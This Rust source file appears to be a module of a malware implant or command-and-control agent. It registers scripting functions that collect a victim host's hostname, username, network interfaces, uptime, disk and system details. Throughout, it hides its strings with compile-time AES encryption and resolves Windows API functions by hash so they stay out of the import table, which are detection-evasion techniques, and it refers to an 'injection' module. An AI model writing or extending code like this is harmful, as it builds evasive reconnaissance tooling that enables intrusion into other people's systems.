// src/agent/scripting/sysinfo.rs
use rhai::Engine;
use serde_json::json;
use crate::strcrypt_rt;
use strcrypt::aes_str;

pub fn register(engine: &mut Engine) {

    engine.register_fn(&aes_str!("internal_hostname"), || -> String {
        sys_info::hostname().unwrap_or_else(|_| aes_str!("unknown"))
    });

    engine.register_fn(&aes_str!("internal_username"), || -> String {
        #[cfg(target_os = "windows")]
        {
            std::env::var(aes_str!("USERNAME")).unwrap_or_else(|_| whoami_native())
        }
        #[cfg(not(target_os = "windows"))]
        {
            std::env::var(aes_str!("USER"))
                .or_else(|_| std::env::var(aes_str!("LOGNAME")))
                .unwrap_or_else(|_| whoami_native())
        }
    });

    // Exposes utils::get_network_interfaces() - already cross-platform.
    // Returns JSON: [{name, mac, ipv4, ipv6, flags}]
    engine.register_fn(&aes_str!("internal_network_interfaces"), || -> String {
        let ifaces = crate::utils::get_network_interfaces();
        serde_json::to_string(&ifaces).unwrap_or("[]".into())
    });

    engine.register_fn(&aes_str!("internal_uptime"), || -> String {
        #[cfg(not(target_os = "windows"))]
        {
            sys_info::boottime()
                .map(|t| {
                    let now = std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .unwrap_or_default()
                        .as_secs();
                    ((now - t.tv_sec as u64) as i64).to_string()
                })
                .unwrap_or_else(|_| aes_str!("-1"))
        }
        #[cfg(target_os = "windows")]
        {
            // Lazily resolved from kernel32.dll by name hash (import-table hygiene).
            unsafe fn GetTickCount64() -> u64 {
                type F = unsafe extern "system" fn() -> u64;
                static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
                let p = *P.get_or_init(|| crate::agent::injection::win_resolve::resolve_ptr(b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetTickCount64")));
                let f: F = unsafe { std::mem::transmute(p) };
                unsafe { f() }
            }
            ((unsafe { GetTickCount64() } / 1000) as i64).to_string()
        }
    });

    engine.register_fn(&aes_str!("internal_disk_info"), || -> String {
        match sys_info::disk_info() {
            Ok(di) => json!({
                aes_str!("total_kb").as_str(): di.total,
                aes_str!("free_kb").as_str():  di.free,
            }).to_string(),
            Err(e) => format!("{}{}", aes_str!("Error: "), e),
        }
    });

    // Convenience: returns the full sysinfo blob as JSON.
    engine.register_fn(&aes_str!("internal_sysinfo_json"), || -> String {
        json!({
            aes_str!("hostname").as_str(): sys_info::hostname().unwrap_or_default(),
            aes_str!("os_type").as_str():  sys_info::os_type().unwrap_or_default(),
            aes_str!("os_release").as_str(): sys_info::os_release().unwrap_or_default(),
            aes_str!("cpu_num").as_str():  sys_info::cpu_num().unwrap_or(0),
            aes_str!("mem_total_kb").as_str(): sys_info::mem_info().map(|m| m.total).unwrap_or(0),
            aes_str!("mem_free_kb").as_str():  sys_info::mem_info().map(|m| m.free).unwrap_or(0),
        }).to_string()
    });
}

fn whoami_native() -> String {
    #[cfg(target_os = "windows")]
    unsafe {
        // Lazily resolved from advapi32.dll by name hash (import-table hygiene).
        unsafe fn GetUserNameA(buf: *mut i8, sz: *mut u32) -> i32 {
            type F = unsafe extern "system" fn(*mut i8, *mut u32) -> i32;
            static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
            let p = *P.get_or_init(|| crate::agent::injection::win_resolve::resolve_ptr(b"advapi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetUserNameA")));
            let f: F = unsafe { std::mem::transmute(p) };
            unsafe { f(buf, sz) }
        }
        let mut buf = vec![0i8; 256];
        let mut sz  = 256u32;
        if GetUserNameA(buf.as_mut_ptr(), &mut sz) != 0 {
            return String::from_utf8_lossy(
                &buf[..sz.saturating_sub(1) as usize]
                    .iter().map(|&b| b as u8).collect::<Vec<_>>()
            ).to_string();
        }
        aes_str!("unknown")
    }
    #[cfg(not(target_os = "windows"))]
    {
        unsafe {
            let uid = libc::getuid();
            let pw  = libc::getpwuid(uid);
            if !pw.is_null() {
                let cstr = std::ffi::CStr::from_ptr((*pw).pw_name);
                return cstr.to_string_lossy().to_string();
            }
        }
        aes_str!("unknown")
    }
}
